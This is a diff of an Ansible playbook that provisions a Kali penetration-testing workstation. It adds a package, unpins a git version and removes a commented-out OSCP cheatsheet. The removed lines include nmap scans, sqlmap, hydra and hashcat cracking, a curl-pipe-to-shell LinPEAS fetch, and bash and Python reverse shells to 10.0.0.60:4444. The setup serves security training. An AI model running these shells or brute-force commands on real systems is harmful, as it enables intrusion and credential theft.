@@ -118,6 +118,7 @@
         - exa
         - tokei
         - bandwhich
+        - cerbero
       become: yes
       ignore_errors: yes
 
@@ -285,7 +286,7 @@
       git:
         repo: "{{ item.repo }}"
         dest: "{{ home_dir }}/machs/tools/{{ item.name }}"
-        version: main
+        # version: main
       become: no
       loop:
         - { repo: 'https://github.com/danielmiessler/SecLists.git', name: 'SecLists' }
@@ -410,138 +411,6 @@
       command: updatedb
       async: 300
       poll: 0
-
-#    - name: Create OSCP quick reference cheatsheet
-#      copy:
-#        content: |
-#            # OSCP Quick Reference Cheatsheet
-#            
-#            ## Rust Tools
-#            ```bash
-#            # RustScan - Fast port scanner
-#            rustscan -a target.com -- -A -sC
-#            
-#            # ripgrep - Better grep
-#            rg "pattern" /path
-#            
-#            # fd - Better find
-#            fd filename
-#            
-#            # bat - Better cat with syntax highlighting
-#            bat file.txt
-#            
-#            # exa - Better ls
-#            exa -lah --icons
-#            ```
-#            
-#            ## Network Scanning
-#            ```bash
-#            # RustScan + Nmap combo
-#            rustscan -a 10.0.0.1-254 --ulimit 5000 -- -A -sC -sV
-#            
-#            # Quick nmap scan
-#            nmap -sV -sC -oA scan target.com
-#            
-#            # Full port scan
-#            nmap -p- -oA fullscan target.com
-#            
-#            # UDP scan
-#            nmap -sU -oA udpscan target.com
-#            
-#            # Network trace
-#            mtr target.com
-#            ```
-#            
-#            ## Web Enumeration
-#            ```bash
-#            # Directory bruteforce
-#            gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
-#            
-#            # Subdomain enumeration
-#            gobuster dns -d target.com -w ~/machs/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
-#            
-#            # Nikto scan
-#            nikto -h http://target.com
-#            ```
-#            
-#            ## Exploitation
-#            ```bash
-#            # Start Metasploit
-#            msfconsole
-#            
-#            # Search for exploits
-#            searchsploit apache 2.4
-#            
-#            # SQLi testing
-#            sqlmap -u "http://target.com/page?id=1" --batch --dbs
-#            ```
-#            
-#            ## Password Attacks
-#            ```bash
-#            # Hydra SSH
-#            hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com
-#            
-#            # John the Ripper
-#            john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-#            
-#            # Hashcat
-#            hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
-#            ```
-#            
-#            ## File Transfers
-#            ```bash
-#            # Start HTTP server
-#            python3 -m http.server 8000
-#            
-#            # Download from target
-#            wget http://10.0.0.60:8000/file
-#            curl http://10.0.0.60:8000/file -o file
-#            
-#            # SMB server
-#            impacket-smbserver share . -smb2support
-#            ```
-#            
-#            ## Privilege Escalation
-#            ```bash
-#            # LinPEAS
-#            curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
-#            
-#            # Local file for enum
-#            ~/machs/tools/LinEnum/LinEnum.sh
-#            
-#            # Check sudo
-#            sudo -l
-#            
-#            # SUID binaries
-#            find / -perm -4000 -type f 2>/dev/null
-#            ```
-#            
-#            ## Reverse Shells
-#            ```bash
-#            # Listener
-#            nc -lvnp 4444
-#            
-#            # Bash
-#            bash -i >& /dev/tcp/10.0.0.60/4444 0>&1
-#            
-#            # Python
-#            python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.60",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
-#            ```
-#            
-#            ## Syncthing
-#            ```bash
-#            # Access web UI (default)
-#            http://127.0.0.1:8384
-#            
-#            # Configure sync folders for machs directory
-#            ```
-#            
-#            ## CherryTree Notes
-#            ```bash
-#            # Launch
-#            cherrytree ~/machs/notes/oscp-notes.ctb
-#            ```
-#        dest: "{{ home_dir }}/machs/OSCP-CHEATSHEET.md"
 
     - import_playbook: playbooks/kali-install-caffiene.yaml
 
